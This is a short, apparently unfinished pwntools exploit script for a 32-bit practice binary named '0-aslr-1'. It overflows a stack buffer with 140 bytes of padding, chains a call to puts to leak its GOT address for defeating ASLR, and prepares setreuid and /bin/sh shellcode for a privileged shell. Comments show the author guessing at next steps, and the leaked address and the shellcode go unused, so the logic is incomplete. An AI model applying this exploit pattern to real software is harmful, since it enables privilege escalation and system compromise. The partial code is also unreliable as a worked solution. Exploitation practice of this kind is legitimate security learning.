from pwn import *
context.arch = "i386"



e = ELF('./0-aslr-1')

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.symbols['main']
set_dumpable_addr = e.symbols['set_dumpable']

payload = flat(
        b'A' * 140
        + p32(puts_plt)
        + p32(main)
        + p32(puts_got)
)

p = e.process()


print(p.recvline()) #where is buf?\n name:
#not sure what to provide here...
#maybe exploit the fact that you can leak addresses form here? maybe the first thing form the output is the buff_addr
shell = asm(shellcraft.i386.linux.setreuid())
shell += asm(shellcraft.i386.linux.sh())
#p.sendline(b'%s'*50)
#payload = (((b'A')* 10))
p.sendline(payload)
puts_leak = u32(p.recv(4))
log.info(f"puts leak? {puts_leak}")

#print(p.recvline().decode('latin1')) #how many bytes of your name do you want to read?
print(p.recv())
#here we need to send the payload
#[shellcode]--padding--->address of buff? read? setvbuf?
p.sendline(b'140')

#addresses = p.recvline().split()


p.interactive()


#core = Core("core")

#buff_addr = core.stack.find(payload)
#print(hex(buff_addr))
#elf = ELF("./0-aslr-1")
#print(hex(elf.symbols['input_func']))